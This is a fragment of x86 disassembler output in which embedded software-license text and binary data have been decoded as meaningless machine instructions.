  43780b:	2c 20                	sub    $0x20,%al
  43780d:	73 65                	jae    0x437874
  43780f:	65 20 68 6f          	and    %ch,%gs:0x6f(%eax)
  437813:	77 74                	ja     0x437889
  437815:	6f                   	outsl  %ds:(%esi),(%dx)
  437816:	74 65                	je     0x43787d
  437818:	6c                   	insb   (%dx),%es:(%edi)
  437819:	6c                   	insb   (%dx),%es:(%edi)
  43781a:	2e 63 6f 6d          	arpl   %ebp,%cs:0x6d(%edi)
  43781e:	2e 0a 79 6f          	or     %cs:0x6f(%ecx),%bh
  437822:	75 20                	jne    0x437844
  437824:	74 6f                	je     0x437895
  437826:	20 75 73             	and    %dh,0x73(%ebp)
  437829:	65 20 74 68 65       	and    %dh,%gs:0x65(%eax,%ebp,2)
  43782e:	20 61 70             	and    %ah,0x70(%ecx)
  437831:	70 6c                	jo     0x43789f
  437833:	69 63 61 62 6c 65 20 	imul   $0x20656c62,0x61(%ebx),%esp
  43783a:	6c                   	insb   (%dx),%es:(%edi)
  43783b:	69 63 65 6e 73 65 64 	imul   $0x6465736e,0x65(%ebx),%esp
  437842:	20 61 70             	and    %ah,0x70(%ecx)
  437845:	70 6c                	jo     0x4378b3
  437847:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  43784e:	20 70 72             	and    %dh,0x72(%eax)
  437851:	6f                   	outsl  %ds:(%esi),(%dx)
  437852:	67 72 61             	addr16 jb 0x4378b6
  437855:	6d                   	insl   (%dx),%es:(%edi)
  437856:	73 20                	jae    0x437878
  437858:	77 68                	ja     0x4378c2
  43785a:	69 63 68 20 61 72 65 	imul   $0x65726120,0x68(%ebx),%esp
  437861:	20 69 6e             	and    %ch,0x6e(%ecx)
  437864:	73 74                	jae    0x4378da
  437866:	61                   	popa
  437867:	6c                   	insb   (%dx),%es:(%edi)
  437868:	6c                   	insb   (%dx),%es:(%edi)
  437869:	65 64 20 6f 6e       	gs and %ch,%fs:0x6e(%edi)
  43786e:	20 61 20             	and    %ah,0x20(%ecx)
  437871:	73 69                	jae    0x4378dc
  437873:	6e                   	outsb  %ds:(%esi),(%dx)
  437874:	67 6c                	insb   (%dx),%es:(%di)
  437876:	65 20 73 65          	and    %dh,%gs:0x65(%ebx)
  43787a:	72 76                	jb     0x4378f2
  43787c:	65 72 20             	gs jb  0x43789f
  43787f:	6f                   	outsl  %ds:(%esi),(%dx)
  437880:	72 20                	jb     0x4378a2
  437882:	6f                   	outsl  %ds:(%esi),(%dx)
  437883:	6e                   	outsb  %ds:(%esi),(%dx)
  437884:	20 6d 75             	and    %ch,0x75(%ebp)
  437887:	6c                   	insb   (%dx),%es:(%edi)
  437888:	74 69                	je     0x4378f3
  43788a:	70 6c                	jo     0x4378f8
  43788c:	65 20 73 65          	and    %dh,%gs:0x65(%ebx)
  437890:	72 76                	jb     0x437908
  437892:	65 72 73             	gs jb  0x437908
  437895:	20 72 65             	and    %dh,0x65(%edx)
  437898:	67 61                	addr16 popa
  43789a:	72 64                	jb     0x437900
  43789c:	6c                   	insb   (%dx),%es:(%edi)
  43789d:	65 73 73             	gs jae 0x437913
  4378a0:	32 e4                	xor    %ah,%ah
  4378a2:	17                   	pop    %ss
  4378a3:	00 73 19             	add    %dh,0x19(%ebx)
  4378a6:	5b                   	pop    %ebx
  4378a7:	a1 9e e0 17 00       	mov    0x17e09e,%eax
  4378ac:	73 68                	jae    0x437916
  4378ae:	72 8e                	jb     0x43783e
  4378b0:	33 6d bd             	xor    -0x43(%ebp),%ebp
  4378b3:	06                   	push   %es
  4378b4:	8d 68 72             	lea    0x72(%eax),%ebp
  4378b7:	8e 33                	mov    (%ebx),%?
  4378b9:	6d                   	insl   (%dx),%es:(%edi)
  4378ba:	df f0                	fcomip %st(0),%st
  4378bc:	5b                   	pop    %ebx
  4378bd:	9d                   	popf
  4378be:	df c6                	ffreep %st(6)
  4378c0:	9b                   	fwait
  4378c1:	65 54                	gs push %esp
  4378c3:	00 72 92             	add    %dh,-0x6e(%edx)
  4378c6:	53                   	push   %ebx
  4378c7:	24 fc                	and    $0xfc,%al
  4378c9:	2c 56                	sub    $0x56,%al
  4378cb:	e9 8f 6c 56 00       	jmp    0x99e55f
  4378d0:	8d 68 56             	lea    0x56(%eax),%ebp
  4378d3:	a1 30 6d a0 05       	mov    0x5a06d30,%eax
  4378d8:	7a e3                	jp     0x4378bd
  4378da:	17                   	pop    %ss
  4378db:	00 62 19             	add    %ah,0x19(%edx)
  4378de:	51                   	push   %ecx
  4378df:	31 b2 84 6e 03 72    	xor    %esi,0x72036e84(%edx)
  4378e5:	6d                   	insl   (%dx),%es:(%edi)
  4378e6:	df f0                	fcomip %st(0),%st
  4378e8:	43                   	inc    %ebx
  4378e9:	9d                   	popf
  4378ea:	df c6                	ffreep %st(6)
  4378ec:	f2 60                	repnz pusha
  4378ee:	5e                   	pop    %esi
  4378ef:	8e 33                	mov    (%ebx),%?
  4378f1:	6d                   	insl   (%dx),%es:(%edi)
  4378f2:	46                   	inc    %esi
  4378f3:	a0 32 e4 17 00       	mov    0x17e432,%al
  4378f8:	d0 7d d6             	sarb   $1,-0x2a(%ebp)
  4378fb:	40                   	inc    %eax
  4378fc:	72 84                	jb     0x437882
  4378fe:	62 ff 8d             	(bad) {rn-bad},{%k2}{z}
  437901:	92                   	xchg   %eax,%edx
  437902:	a0 05 7a e3 17       	mov    0x17e37a05,%al
  437907:	00 76 19             	add    %dh,0x19(%esi)
  43790a:	51                   	push   %ecx
  43790b:	31 b2 84 5a 03 72    	xor    %esi,0x72035a84(%edx)
  437911:	6d                   	insl   (%dx),%es:(%edi)
  437912:	d7                   	xlat   %ds:(%ebx)
  437913:	c6 02 2b             	movb   $0x2b,(%edx)
  437916:	56                   	push   %esi
  437917:	00 f2                	add    %dh,%dl
  437919:	60                   	pusha
  43791a:	5e                   	pop    %esi
  43791b:	8e 33                	mov    (%ebx),%?
  43791d:	6d                   	insl   (%dx),%es:(%edi)
  43791e:	52                   	push   %edx
  43791f:	e9 60 92 a9 ff       	jmp    0xffed0b84
  437924:	84 68 5e             	test   %ch,0x5e(%eax)
  437927:	8e 33                	mov    (%ebx),%?
  437929:	6d                   	insl   (%dx),%es:(%edi)
  43792a:	5e                   	pop    %esi
  43792b:	74 75                	je     0x4379a2
  43792d:	5c                   	pop    %esp
  43792e:	96                   	xchg   %eax,%esi
  43792f:	e9 98 6f 56 00       	jmp    0x99e8cc
  437934:	ca 20 06             	lret   $0x620
  437937:	00 72 9a             	add    %dh,-0x66(%edx)
  43793a:	b0 89                	mov    $0x89,%al
  43793c:	37                   	aaa
  43793d:	9d                   	popf
  43793e:	df c6                	ffreep %st(6)
  437940:	f2 60                	repnz pusha
  437942:	5e                   	pop    %esi
  437943:	8e 33                	mov    (%ebx),%?
  437945:	6d                   	insl   (%dx),%es:(%edi)
  437946:	5e                   	pop    %esi
  437947:	a0 32 e4 17 00       	mov    0x17e432,%al
  43794c:	d0 5d d9             	rcrb   $1,-0x27(%ebp)
  43794f:	41                   	inc    %ecx
  437950:	72 84                	jb     0x4378d6
  437952:	b6 fe                	mov    $0xfe,%dh
  437954:	8d 92 a0 05 7a e3    	lea    -0x1c85fa60(%edx),%edx
  43795a:	17                   	pop    %ss
  43795b:	00 73 19             	add    %dh,0x19(%ebx)
  43795e:	51                   	push   %ecx
  43795f:	31 b2 84 ee 02 72    	xor    %esi,0x7202ee84(%edx)
  437965:	6d                   	insl   (%dx),%es:(%edi)
  437966:	df f0                	fcomip %st(0),%st
  437968:	5b                   	pop    %ebx
  437969:	9d                   	popf
  43796a:	df c6                	ffreep %st(6)
  43796c:	f2 60                	repnz pusha
  43796e:	5e                   	pop    %esi
  43796f:	8e 33                	mov    (%ebx),%?
  437971:	6d                   	insl   (%dx),%es:(%edi)
  437972:	57                   	push   %edi
  437973:	c7                   	(bad)
  437974:	77 81                	ja     0x4378f7
  437976:	db 41 72             	fildl  0x72(%ecx)
  437979:	6f                   	outsl  %ds:(%esi),(%dx)
  43797a:	56                   	push   %esi
  43797b:	00 72 84             	add    %dh,-0x7c(%edx)
  43797e:	e2 fe                	loop   0x43797e
  437980:	8d 92 a0 05 7a e3    	lea    -0x1c85fa60(%edx),%edx
  437986:	17                   	pop    %ss
  437987:	00 70 19             	add    %dh,0x19(%eax)
  43798a:	51                   	push   %ecx
  43798b:	31 b2 84 da 02 72    	xor    %esi,0x7202da84(%edx)
  437991:	6d                   	insl   (%dx),%es:(%edi)
  437992:	df f0                	fcomip %st(0),%st
  437994:	43                   	inc    %ebx
  437995:	9d                   	popf
  437996:	df c6                	ffreep %st(6)
  437998:	f2 60                	repnz pusha
  43799a:	5e                   	pop    %esi
  43799b:	8e 33                	mov    (%ebx),%?
  43799d:	6d                   	insl   (%dx),%es:(%edi)
  43799e:	54                   	push   %esp
  43799f:	c7                   	(bad)
  4379a0:	77 29                	ja     0x4379cb
  4379a2:	df 41 72             	filds  0x72(%ecx)
  4379a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4379a6:	56                   	push   %esi
  4379a7:	00 72 84             	add    %dh,-0x7c(%edx)
  4379aa:	de fe                	fdivrp %st,%st(6)
  4379ac:	8d 92 a9 05 72 cc    	lea    -0x338dfa57(%edx),%edx
  4379b2:	14 00                	adc    $0x0,%al
  4379b4:	8d 68 72             	lea    0x72(%eax),%ebp
  4379b7:	8e 33                	mov    (%ebx),%?
  4379b9:	6d                   	insl   (%dx),%es:(%edi)
  4379ba:	d7                   	xlat   %ds:(%ebx)
  4379bb:	f6 d3                	not    %bl
  4379bd:	3f                   	aas
  4379be:	56                   	push   %esi
  4379bf:	00 f2                	add    %dh,%dl
  4379c1:	60                   	pusha
  4379c2:	5e                   	pop    %esi
  4379c3:	8e 33                	mov    (%ebx),%?
  4379c5:	6d                   	insl   (%dx),%es:(%edi)
  4379c6:	16                   	push   %ss
  4379c7:	e9 73 6c 56 00       	jmp    0x99e63f
  4379cc:	d3 81 db 41 72 6c    	roll   %cl,0x6c7241db(%ecx)
  4379d2:	53                   	push   %ebx
  4379d3:	24 fc                	and    $0xfc,%al
  4379d5:	2c 56                	sub    $0x56,%al
  4379d7:	81 b4 54 32 00 72 ed 	xorl   $0x2cfc085b,-0x128dffce(%esp,%edx,2)
  4379de:	5b 08 fc 2c 
  4379e2:	56                   	push   %esi
  4379e3:	40                   	inc    %eax
  4379e4:	9b                   	fwait
  4379e5:	89 56 00             	mov    %edx,0x0(%esi)
  4379e8:	72 cc                	jb     0x4379b6
  4379ea:	ba 8d 33 6d d5       	mov    $0xd56d338d,%edx
  4379ef:	c0 70 6c 53          	shlb   $0x53,0x6c(%eax)
  4379f3:	24 fc                	and    $0xfc,%al
  4379f5:	2c 56                	sub    $0x56,%al
  4379f7:	e9 a3 6d 56 00       	jmp    0x99e79f
  4379fc:	d3 29                	shrl   %cl,(%ecx)
  4379fe:	df                   	.byte 0xdf
  4379ff:	41                   	inc    %ecx
